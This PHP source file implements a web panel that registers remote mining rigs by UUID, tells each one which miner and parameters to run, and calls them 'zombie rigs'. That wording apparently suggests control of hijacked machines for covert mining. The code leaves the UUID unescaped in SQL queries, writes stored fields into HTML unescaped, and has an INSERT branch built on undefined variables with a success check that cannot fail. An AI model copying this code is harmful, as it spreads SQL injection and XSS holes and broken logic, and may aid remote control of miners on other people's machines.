<?php

require_once 'base.php';

# add new algo
if (isset($_POST["update_uuid"])) {
	# $uuid, $name, $miner, $miner_parameters, $comment
	addUpdateTask ([
		'uuid' => $_POST["update_uuid"], 
		'name' => $_POST["name"], 
		'miner' => $_POST["miner"], 
		'miner_parameters' => $_POST["miner_parameters"],
		'comment' => $_POST["comment"], 
		 ]);
}


# get uuid, return miner and miner_parameters for remote system
function getTaskByUuid($uuid) {
	$query = "SELECT * FROM `tasks` WHERE `uuid` = '$uuid'";
	$return = base_query ($query);
	
	if ($return = $return->fetch_array(MYSQLI_ASSOC)) {
	$tasks_from_file = $return;

	$return_tasks["miner"] = $tasks_from_file["miner"];
	$return_tasks["miner_parameters"] = $tasks_from_file["miner_parameters"];
	
	# update last access time
	addUpdateTask (['uuid' => $uuid, 'time' => time()]);

	return $return_tasks;
	} else {
	# if new rig connected, add it to file with blank fields
			# $uuid, $name, $miner, $miner_parameters, $comment
			addUpdateTask (['uuid' => $uuid, 'time' => time()]);
			return false;
	}
}

# if we received post request to add/update task
# update tasks in base accordingly
# $uuid, $name, $miner, $miner_parameters, $comment
function addUpdateTask ($args) {
	$uuid = $args["uuid"];

	$query = "SELECT * FROM `tasks` WHERE `uuid` = '$uuid'";
	
	$return = base_query ($query);
	
	# if uuid was found then update
	if ($return = $return->fetch_array(MYSQLI_ASSOC)) {

	$tasks_from_file = $return;
	
	$tasks_from_file = array (
	"name" => (isset($args["name"])) ? $args["name"] : $tasks_from_file["name"],
	"miner" => (isset($args["miner"])) ? $args["miner"] : $tasks_from_file["miner"],
	"miner_parameters" => (isset($args["miner_parameters"])) ? $args["miner_parameters"] : $tasks_from_file["miner_parameters"],
	"comment" => (isset($args["comment"])) ? $args["comment"] : $tasks_from_file["comment"],
	"time" => (isset($args["time"])) ? $args["time"] : $tasks_from_file["time"]
	);

	$query = "UPDATE `tasks` SET 
	`name` = '".mysql_escape_string($tasks_from_file["name"])."', 
	`miner` = '".mysql_escape_string($tasks_from_file["miner"])."', 
	`miner_parameters` = '".mysql_escape_string($tasks_from_file["miner_parameters"])."', 
	`comment` = '".mysql_escape_string($tasks_from_file["comment"])."', 
	`time` = '".mysql_escape_string($tasks_from_file["time"])."' 
	WHERE `uuid` = '$uuid'";
	} else {
		# for new record add it to base
		$query = "INSERT INTO `tasks` SET 
			`time` = '".time()."',
			`uuid` = '$uuid',
			`name` = '$new_name',
			`miner` = '$new_miner',
			`miner_parameters` = '$new_miner_parameters',
			`comment` = '$new_comment'
		";
		if ($query) {
		    echo '<p>Data successfully added to table.</p>';
		} else {
		    echo '<p>Error: ' . mysqli_error() . '</p>';
		}
	}
	
	$return = base_query ($query);
	
}

# returns control form to add/remove zombie rigs
function getControlForm() {
	$query = "SELECT * FROM `tasks`";
	$return = base_query ($query);
	
			$table = '<table class="table table-striped table-bordered table-hover table-sm">';
			$table .= '
			<thead>
				<tr>
					<th>ID</th>
					<th>Name</th>
					<th>Status</th>
					<th>Comment</th>
					<th>Setup</th>					
				</tr>
			</thead>
			';

	$total_counter = 0;
	$online_counter = 0;
	while ($uuid_task_data = $return->fetch_array(MYSQLI_ASSOC)) {
		$total_counter ++;

			$uuid = $uuid_task_data["uuid"];
			# if last request from rig was less than 70 seconds ago,
			# show rig as online
			# otherwise - offline
			if (time() - $uuid_task_data["time"] < 70) {
				$online_status = '<span class="badge badge-success">Online</span>';
				$online_counter++;
			} else {
				$online_status = '<span class="badge badge-danger">Offline</span>';	
			}
			
			$update_task_form = '';
			$update_task_form .= '	
			<form method="POST">'.
			$online_status.
			' <b>'.$uuid_task_data["name"].'</b>'.
			' ('.$uuid.')'.
			':
				<div class="input-group">
					<div class="input-group-prepend">
						<span class="input-group-text" >Rig name:</span>
					</div>
				<input type="text" name="name" class="form-control" aria-label="name" placeholder="name" value="'.$uuid_task_data["name"].'">
				</div>

				<div class="input-group">
					<input type="text" name="miner" class="form-control" aria-label="miner" placeholder="miner" value="'.$uuid_task_data["miner"].'">
					<input type="text" name="miner_parameters" class="form-control" aria-label="miner_parameters" placeholder="miner_parameters" value="'.$uuid_task_data["miner_parameters"].'">
				
					<div class="input-group-append">
					<button class="btn btn-warning" type="submit" name="update_uuid" value="'.$uuid.'">Update</button>
		    		</div>
				</div>

				<input type="text" name="comment" class="form-control" aria-label="comment" placeholder="comment" value="'.$uuid_task_data["comment"].'">

			</form>
			';

			$table .= '<tr> <form method="POST">';
			$table .= "<td>".
			$uuid.
			'<div class="input-group">'.
				'<input type="text" id="input_miner_'.$uuid.'" style="display: none;" name="miner" class="form-control" aria-label="miner" placeholder="miner" value="'.$uuid_task_data["miner"].'">'.
				'<input type="text" id="input_miner_parameters_'.$uuid.'" style="display: none;" name="miner_parameters" class="form-control" aria-label="miner_parameters" placeholder="miner_parameters" value="'.$uuid_task_data["miner_parameters"].'">'.
			'</div>'.
			"</td>";
			$table .= "<td>".
			$uuid_task_data["name"].
			'<input type="text" id="input_name_'.$uuid.'" style="display: none;" name="name" class="form-control" aria-label="name" placeholder="name" value="'.$uuid_task_data["name"].'">'.
			"</td>";
			$table .= "<td>".$online_status."</td>";
			$table .= "<td>".
			$uuid_task_data["comment"].
			'<input type="text" id="input_comment_'.$uuid.'" style="display: none;" name="comment" class="form-control" aria-label="comment" placeholder="comment" value="'.$uuid_task_data["comment"].'">'.
			"</td>";
			$table .= "<td>".
			'<button id="'.$uuid.'" class="btn btn-info" type="button" name="update_uuid" value="'.$uuid.'"
			onclick="$(\'#input_miner_'.$uuid.','.'#input_miner_parameters_'.$uuid.','.'#input_name_'.$uuid.','.'#input_comment_'.$uuid.','.'#update_button_'.$uuid.'\').toggle();" 
			>Setup</button>'.
			' <button id="update_button_'.$uuid.'" style="display:none;" class="btn btn-warning" type="submit" name="update_uuid" value="'.$uuid.'">Update</button>'.
			"</td>";
			$table .= "</form> </tr>";

		}

		$table .= "
		<tr class=\"table-info\">
			<td>$total_counter total</td> 
			<td></td>
			<td>$online_counter/$total_counter online</td>
			<td></td>
			<td></td>
		</tr>
		";
		$table .= "</table>";

	$add_zombie_rig_form = '
		<form method="POST" id="addNewRow">
		  <div class="input-group">
			<input type="text" id="" style="" name="miner" class="form-control" aria-label="miner" placeholder="Miner" value="">
			<input type="text" id="" style="" name="miner_parameters" class="form-control" aria-label="miner_parameters" placeholder="Parameters" value="">
			<input type="text" id="" style="" name="name" class="form-control" aria-label="name" placeholder="Name" value="">
			<input type="text" id="" style="" name="comment" class="form-control" aria-label="comment" placeholder="Comment" value="">
			<button id="" style="width: 72px;" class="btn btn-success" type="submit" name="add" value="" onclick="">Add</button>
		  </div>
		</form>
			';

	$controlForm = $table.$add_zombie_rig_form;
	return $controlForm;
	
}

?>